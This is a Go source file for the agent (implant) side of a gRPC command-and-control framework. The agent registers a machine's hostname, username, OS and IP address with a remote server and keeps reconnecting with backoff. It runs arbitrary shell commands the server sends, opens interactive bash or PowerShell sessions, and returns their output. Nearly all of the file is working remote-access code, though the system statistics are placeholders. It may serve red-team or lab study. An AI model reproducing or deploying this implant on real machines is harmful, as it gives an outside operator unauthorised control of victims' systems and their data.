package agent

import (
	"context"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/grpc/keepalive"

	pb "portal/proto"
)

// ShellSession represents an interactive shell session
type ShellSession struct {
	Cmd    *exec.Cmd
	Stdin  io.WriteCloser
	Stdout io.ReadCloser
	Stderr io.ReadCloser
	Buffer []byte
	Output chan []byte
}

// C2Agent is the client for the C2 framework
type C2Agent struct {
	serverAddr  string
	agentID     string
	info        *pb.AgentInfo
	conn        *grpc.ClientConn
	client      pb.C2ServiceClient
	ctx         context.Context
	cancel      context.CancelFunc
	wg          sync.WaitGroup
	commandChan chan *pb.Command
	shellSession *ShellSession
}

// NewC2Agent creates a new C2 agent
func NewC2Agent(serverAddr string) *C2Agent {
	ctx, cancel := context.WithCancel(context.Background())

	return &C2Agent{
		serverAddr:  serverAddr,
		ctx:         ctx,
		cancel:      cancel,
		commandChan: make(chan *pb.Command, 10),
	}
}

// Connect establishes a connection with the C2 server
func (a *C2Agent) Connect() error {
	// If already connected, close the existing connection
	if a.conn != nil {
		a.conn.Close()
		a.conn = nil
	}

	log.Printf("Connecting to C2 server at %s", a.serverAddr)

	var opts []grpc.DialOption
	opts = append(opts, grpc.WithTransportCredentials(insecure.NewCredentials()))
	opts = append(opts, grpc.WithKeepaliveParams(keepalive.ClientParameters{
		Time:                10 * time.Second,
		Timeout:             5 * time.Second,
		PermitWithoutStream: true,
	}))

	// Add connection timeout
	ctx, cancel := context.WithTimeout(a.ctx, 10*time.Second)
	defer cancel()

	// Connect with context timeout
	conn, err := grpc.DialContext(ctx, a.serverAddr, append(opts,
		grpc.WithBlock(), // Make dial blocking with the context timeout
		grpc.WithDisableRetry(),
	)...)

	if err != nil {
		return fmt.Errorf("failed to connect to server: %w", err)
	}

	a.conn = conn
	a.client = pb.NewC2ServiceClient(conn)
	log.Printf("Successfully connected to C2 server at %s", a.serverAddr)

	return nil
}

// Register registers the agent with the C2 server
func (a *C2Agent) Register() error {
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}

	// Get username
	username := "unknown"
	if u, err := os.UserHomeDir(); err == nil {
		username = filepath.Base(u)
	}

	// Get IP address
	ipAddress := getLocalIPAddress()

	// Create agent info
	info := &pb.AgentInfo{
		Hostname:         hostname,
		Os:               runtime.GOOS,
		Architecture:     runtime.GOARCH,
		Username:         username,
		IpAddress:        ipAddress,
		RegistrationTime: time.Now().Unix(),
	}

	// Log the info being sent
	log.Printf("Registering agent with IP: %s, Hostname: %s, OS: %s",
		ipAddress, hostname, runtime.GOOS)

	// Register with server
	resp, err := a.client.RegisterAgent(a.ctx, info)
	if err != nil {
		return fmt.Errorf("failed to register agent: %w", err)
	}

	if !resp.Success {
		return fmt.Errorf("registration failed: %s", resp.ErrorMessage)
	}

	a.agentID = resp.AgentId
	a.info = info
	a.info.AgentId = resp.AgentId

	log.Printf("Agent registered successfully with ID: %s", a.agentID)
	return nil
}

// getLocalIPAddress attempts to get a non-loopback local IP address
func getLocalIPAddress() string {
	// Try multiple network interfaces to find a valid IP
	interfaces, err := net.Interfaces()
	if err != nil {
		return "127.0.0.1" // Fallback to localhost
	}

	for _, iface := range interfaces {
		// Skip loopback, down interfaces, and virtual machines
		if iface.Flags&net.FlagLoopback != 0 || iface.Flags&net.FlagUp == 0 {
			continue
		}

		// Get addresses for this interface
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}

		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}

			// Skip non-IPv4 and loopback addresses
			if ip == nil || ip.IsLoopback() || ip.To4() == nil {
				continue
			}

			return ip.String()
		}
	}

	// Couldn't find a suitable IP, check for external IP
	externalIP := getExternalIP()
	if externalIP != "" {
		return externalIP
	}

	return "unknown" // Nothing worked
}

// getExternalIP attempts to get the external IP of the machine
func getExternalIP() string {
	// Try connecting to a public service to determine external IP
	// This only works if the machine has internet connectivity
	client := http.Client{
		Timeout: 5 * time.Second,
	}

	resp, err := client.Get("https://api.ipify.org")
	if err != nil {
		return ""
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return ""
	}

	return string(body)
}

// sendHeartbeat sends a heartbeat to the server
func (a *C2Agent) sendHeartbeat() {
	// Make sure agentID is not empty
	if a.agentID == "" {
		log.Printf("ERROR: Cannot send heartbeat with empty agent ID")
		return
	}

	// Update IP address in case it has changed
	ipAddress := getLocalIPAddress()
	if ipAddress != a.info.IpAddress && ipAddress != "unknown" {
		a.info.IpAddress = ipAddress
		log.Printf("Agent IP updated to: %s", ipAddress)
	}

	// Make sure we never send an empty IP
	if ipAddress == "" || ipAddress == "unknown" {
		ipAddress = "127.0.0.1"
	}

	log.Printf("Sending heartbeat for agent %s from IP %s", a.agentID, ipAddress)

	stats := &pb.SystemStats{
		CpuUsage:    getCPUUsage(),
		MemoryUsage: getMemoryUsage(),
		Uptime:      getUptime(),
	}

	req := &pb.HeartbeatRequest{
		AgentId:    a.agentID,
		Timestamp:  time.Now().Unix(),
		Stats:      stats,
		IpAddress:  ipAddress,
	}

	resp, err := a.client.Heartbeat(a.ctx, req)
	if err != nil {
		log.Printf("Failed to send heartbeat: %v", err)
		// On heartbeat failure, attempt to reconnect
		go func() {
			if reconnectErr := a.reConnect(); reconnectErr != nil {
				log.Printf("Failed to reconnect after heartbeat failure: %v", reconnectErr)
			}
		}()
		return
	}

	if !resp.Success {
		log.Printf("Heartbeat not acknowledged by server: %s", resp.Message)
		// Server didn't acknowledge our heartbeat, attempt to re-register
		go func() {
			if reconnectErr := a.reConnect(); reconnectErr != nil {
				log.Printf("Failed to reconnect after heartbeat rejection: %v", reconnectErr)
			}
		}()
	} else {
		log.Printf("Heartbeat successfully sent and acknowledged: %s", resp.Message)
	}
}

// StartHeartbeat starts sending periodic heartbeats to the server
func (a *C2Agent) StartHeartbeat(interval time.Duration) {
	a.wg.Add(1)
	go func() {
		defer a.wg.Done()
		ticker := time.NewTicker(interval)
		defer ticker.Stop()

		for {
			select {
			case <-ticker.C:
				a.sendHeartbeat()
			case <-a.ctx.Done():
				log.Println("Heartbeat goroutine stopped")
				return
			}
		}
	}()
}

// StartCommandStream starts the bidirectional command stream
func (a *C2Agent) StartCommandStream() error {
	a.wg.Add(1)
	go func() {
		defer a.wg.Done()

		reconnectDelay := 5 * time.Second
		maxReconnectDelay := 60 * time.Second
		consecutiveFailures := 0

		for {
			err := a.handleCommandStream()
			if err != nil {
				consecutiveFailures++
				log.Printf("Command stream error: %v, reconnecting in %v... (Failure #%d)",
					err, reconnectDelay, consecutiveFailures)

				// Update agentID for the logs
				agentIDLog := a.agentID
				if agentIDLog == "" {
					agentIDLog = "unregistered"
				}

				log.Printf("Agent %s disconnected from server, will attempt to reconnect", agentIDLog)

				select {
				case <-a.ctx.Done():
					return
				case <-time.After(reconnectDelay):
					// Exponential backoff with a cap
					reconnectDelay = min(reconnectDelay*2, maxReconnectDelay)

					// After several consecutive failures, try a complete reconnection
					if consecutiveFailures > 3 {
						log.Printf("Multiple consecutive failures detected. Attempting full reconnection...")
						if reconnectErr := a.reConnect(); reconnectErr != nil {
							log.Printf("Full reconnection failed: %v", reconnectErr)
						} else {
							// Reset the failure counter on successful reconnection
							consecutiveFailures = 0
							reconnectDelay = 5 * time.Second
						}
					}
				}
			} else {
				// Reset on successful connection
				reconnectDelay = 5 * time.Second
				consecutiveFailures = 0
			}
		}
	}()
	return nil
}

// handleCommandStream manages the command stream
func (a *C2Agent) handleCommandStream() error {
	stream, err := a.client.SendCommands(a.ctx)
	if err != nil {
		log.Printf("Failed to establish command stream: %v", err)
		// If we can't establish a stream, try to re-register
		if reconnectErr := a.reConnect(); reconnectErr != nil {
			log.Printf("Failed to reconnect: %v", reconnectErr)
		}
		return err
	}

	// Send initial message with agent ID using Command message
	initCmd := &pb.Command{
		Id:          a.agentID, // Using Id to pass agent ID
		CommandType: "register",
		Timestamp:   time.Now().Unix(),
	}
	if err := stream.Send(initCmd); err != nil {
		log.Printf("Failed to send init command: %v", err)
		return err
	}

	log.Printf("Command stream established, sent initial registration with ID: %s", a.agentID)

	// Start goroutine to handle incoming command responses
	errCh := make(chan error, 1)
	go func() {
		for {
			resp, err := stream.Recv()
			if err != nil {
				errCh <- err
				return
			}

			log.Printf("Received command response: %s, success: %v", resp.CommandId, resp.Success)
			// Process command
			go a.executeCommandResponse(resp, stream)
		}
	}()

	select {
	case err := <-errCh:
		log.Printf("Command stream error: %v", err)
		// Try to reconnect when we get a stream error
		if reconnectErr := a.reConnect(); reconnectErr != nil {
			log.Printf("Failed to reconnect: %v", reconnectErr)
		}
		return err
	case <-a.ctx.Done():
		return stream.CloseSend()
	}
}

// executeCommandResponse processes a command response from the server
func (a *C2Agent) executeCommandResponse(resp *pb.CommandResponse, stream pb.C2Service_SendCommandsClient) {
	// Extract the command from the response
	commandString := string(resp.Result)
	var result []byte

	log.Printf("Executing command: %s", commandString)

	// Execute the command based on the original command type
	if resp.CommandId != "" {
		switch {
		case strings.HasPrefix(commandString, "shell:"):
			shellCmd := strings.TrimPrefix(commandString, "shell:")
			output, err := executeShellCommand(shellCmd)
			if err != nil {
				result = []byte(err.Error())
			} else {
				result = output
			}
		case strings.HasPrefix(commandString, "interactive:"):
			shellCmd := strings.TrimPrefix(commandString, "interactive:")
			// For interactive shell, start a persistent shell session
			if a.shellSession == nil {
				var cmd *exec.Cmd
				// Use the shellCmd if provided, otherwise use default shell
				if runtime.GOOS == "windows" {
					if shellCmd != "" {
						cmd = exec.Command("powershell.exe", "-NoLogo", "-Command", shellCmd)
					} else {
						cmd = exec.Command("powershell.exe", "-NoLogo")
					}
				} else {
					if shellCmd != "" {
						cmd = exec.Command("/bin/bash", "-c", shellCmd)
					} else {
						cmd = exec.Command("/bin/bash")
					}
				}

				// Set environment variables
				cmd.Env = os.Environ()

				// Create pipes for stdin/stdout
				stdin, err := cmd.StdinPipe()
				if err != nil {
					result = []byte(fmt.Sprintf("Failed to create stdin pipe: %v", err))
					break
				}

				stdout, err := cmd.StdoutPipe()
				if err != nil {
					result = []byte(fmt.Sprintf("Failed to create stdout pipe: %v", err))
					break
				}

				stderr, err := cmd.StderrPipe()
				if err != nil {
					result = []byte(fmt.Sprintf("Failed to create stderr pipe: %v", err))
					break
				}

				// Store shell session info
				a.shellSession = &ShellSession{
					Cmd:    cmd,
					Stdin:  stdin,
					Stdout: stdout,
					Stderr: stderr,
					Buffer: make([]byte, 4096),
					Output: make(chan []byte, 100),
				}

				// Start the command
				log.Printf("Starting interactive shell with command: %s", cmd.String())
				if err := cmd.Start(); err != nil {
					result = []byte(fmt.Sprintf("Failed to start shell: %v", err))
					a.shellSession = nil
					break
				}

				// Read from stdout and stderr in separate goroutines
				go func() {
					buffer := make([]byte, 1024)
					for {
						n, err := stdout.Read(buffer)
						if err != nil {
							if err != io.EOF {
								log.Printf("Stdout read error: %v", err)
							}
							return
						}
						if n > 0 {
							log.Printf("Shell output received (%d bytes)", n)
							a.shellSession.Output <- buffer[:n]
						}
					}
				}()

				go func() {
					buffer := make([]byte, 1024)
					for {
						n, err := stderr.Read(buffer)
						if err != nil {
							if err != io.EOF {
								log.Printf("Stderr read error: %v", err)
							}
							return
						}
						if n > 0 {
							log.Printf("Shell error output received (%d bytes)", n)
							a.shellSession.Output <- buffer[:n]
						}
					}
				}()

				// Wait for the command to complete in a separate goroutine
				go func() {
					if err := cmd.Wait(); err != nil {
						log.Printf("Shell session ended: %v", err)
					} else {
						log.Printf("Shell session completed normally")
					}
					// Clean up when the session ends
					a.shellSession = nil
				}()

				result = []byte("Interactive shell session started successfully")
			} else {
				result = []byte("Shell session already running")
			}
		case strings.HasPrefix(commandString, "input:"):
			inputCmd := strings.TrimPrefix(commandString, "input:")
			if a.shellSession != nil && a.shellSession.Stdin != nil {
				log.Printf("Sending input to shell: %q", inputCmd)
				// Ensure command is properly terminated with newline
				if !strings.HasSuffix(inputCmd, "\n") {
					inputCmd += "\n"
				}
				_, err := a.shellSession.Stdin.Write([]byte(inputCmd))
				if err != nil {
					log.Printf("Failed to write to shell: %v", err)
					result = []byte(fmt.Sprintf("Failed to write to shell: %v", err))
				} else {
					result = []byte("Input sent successfully")
				}
			} else {
				log.Printf("No active shell session for input command")
				result = []byte("No active shell session")
			}
		case strings.HasPrefix(commandString, "output:"):
			if a.shellSession != nil {
				// Try to read any available output with a longer timeout
				select {
				case output := <-a.shellSession.Output:
					log.Printf("Returning shell output (%d bytes)", len(output))
					result = output
				case <-time.After(500 * time.Millisecond):
					// No output available, return empty but don't treat as error
					result = []byte("")
				}
			} else {
				result = []byte("No active shell session")
			}
		default:
			// For other command types
			result = []byte(fmt.Sprintf("Received command: %s", commandString))
		}
	}

	// Send the result back
	cmd := &pb.Command{
		Id:          resp.CommandId,
		CommandType: "response",
		Payload:     result,
		Timestamp:   time.Now().Unix(),
	}

	if err := stream.Send(cmd); err != nil {
		log.Printf("Failed to send command result: %v", err)
	}
}

// executeShellCommand executes a shell command and returns its output
func executeShellCommand(command string) ([]byte, error) {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("command execution error: %w", err)
	}

	return output, nil
}

// Stop gracefully stops the agent
func (a *C2Agent) Stop() {
	a.cancel()
	a.wg.Wait()
	if a.conn != nil {
		a.conn.Close()
	}
	log.Println("Agent stopped")
}

// Helper functions
func getCPUUsage() float64 {
	// This is a placeholder - in a real implementation you would
	// measure actual CPU usage
	return 5.0
}

func getMemoryUsage() float64 {
	// This is a placeholder - in a real implementation you would
	// measure actual memory usage
	return 20.0
}

func getUptime() int64 {
	// This is a placeholder - in a real implementation you would
	// get the system uptime
	return 3600
}

// reConnect handles reconnection when connection is lost
func (a *C2Agent) reConnect() error {
	log.Println("Attempting to reconnect to server...")

	// Close existing connection if any
	if a.conn != nil {
		a.conn.Close()
		a.conn = nil
	}

	// Add a small delay to prevent rapid reconnection attempts
	time.Sleep(2 * time.Second)

	// Try to establish a new connection with backoff
	var connErr error
	for attempt := 1; attempt <= 3; attempt++ {
		log.Printf("Connection attempt %d/3...", attempt)
		connErr = a.Connect()
		if connErr == nil {
			break
		}
		log.Printf("Failed to connect: %v", connErr)
		time.Sleep(time.Duration(attempt) * 2 * time.Second)
	}

	// If we couldn't reconnect after all attempts, return the error
	if connErr != nil {
		return fmt.Errorf("failed to reconnect after multiple attempts: %w", connErr)
	}

	log.Println("Connection re-established, re-registering with server...")

	// Re-register with the server
	registerErr := a.Register()
	if registerErr != nil {
		log.Printf("Failed to re-register: %v, will try again later", registerErr)
		return registerErr
	}

	log.Printf("Successfully reconnected and re-registered as agent %s", a.agentID)
	return nil
}

// min returns the smaller of two time.Duration values
func min(a, b time.Duration) time.Duration {
	if a < b {
		return a
	}
	return b
}